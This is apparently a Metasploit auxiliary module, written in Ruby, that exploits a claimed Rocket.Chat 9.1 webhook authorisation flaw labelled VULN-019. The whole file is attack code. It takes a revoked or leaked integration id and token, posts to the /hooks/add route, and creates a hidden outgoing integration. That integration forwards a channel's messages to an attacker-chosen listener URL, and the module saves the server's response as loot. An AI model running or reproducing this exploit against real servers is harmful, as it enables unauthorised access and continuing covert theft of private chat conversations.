class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat 9.1 outgoing integration created with a revoked webhook token (VULN-019)',
        'Description' => %q{
          Rocket.Chat resolves a /hooks credential on id and token alone, and the add
          sub-route mounted beside the posting handler checks neither that the
          integration is enabled nor that its user may impersonate. A webhook URL an
          administrator revoked, or an outgoing integration's token that the server
          hands to third parties on every trigger, is therefore enough to create a new
          integration as that integration's configured user. This module posts to
          /hooks/add with the credential the operator names and creates an enabled
          outgoing integration that forwards a channel's messages to a URL the
          operator chooses, then reports the integration the server created. It needs
          the post-as user to hold one of the outgoing-integration permissions.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/hooks']),
      OptString.new('INTEGRATIONID', [true, 'An existing integration\'s id (enabled or revoked)', '6b057642e7422a44df31d418']),
      OptString.new('INTEGRATIONTOKEN', [true, 'That integration\'s token, as it appears in its webhook URL', 'ymgPjtce2ciMEZjx5fJSA5hoMgEmFRSuxWF8LGux4u3vyXFG']),
      OptString.new('INTEGRATIONUSER', [true, 'The integration\'s post-as user, the third path segment the add and remove sub-routes take', 'rocket.cat']),
      OptString.new('TARGETURL', [true, 'The URL the outgoing integration this module creates will post the room\'s messages to (your own listener)', 'http://127.0.0.1:8000/blue-spider']),
      OptString.new('CHANNEL', [true, 'The channel whose messages the new integration forwards', '#general'])
    ])
  end

  def run
    res = create_outgoing
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = !parse_json(res)['_id'].to_s.empty? && parse_json(res)['urls'].to_a.include?(datastore['TARGETURL'])
    fail_with(Failure::NotVulnerable, 'VULN-019: the attack did not land') unless hit

    print_good("#{peer} - VULN-019: exploited")
    doc = parse_json(res)
    print_good("#{peer} - created outgoing integration #{doc['_id']} "\
               "as #{doc['username']}, forwarding #{datastore['CHANNEL']} "\
               "to #{doc['urls'].to_a.join(', ')} (enabled=#{doc['enabled']})")
    path = store_loot('blue_spider.vuln_019', 'text/plain', rhost, res.body.to_s, 'vuln_019.txt', 'VULN-019 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-019 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def create_outgoing
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'add', datastore['INTEGRATIONID'],
                             datastore['INTEGRATIONUSER'],
                             datastore['INTEGRATIONTOKEN']),
      'ctype' => 'application/json',
      'data' => { 'event' => 'sendMessage', 'target_url' => datastore['TARGETURL'],
                  'name' => "bs-#{Rex::Text.rand_text_alphanumeric(8)}",
                  'channel' => datastore['CHANNEL'],
                  'enabled' => true }.to_json
    })
  end
end
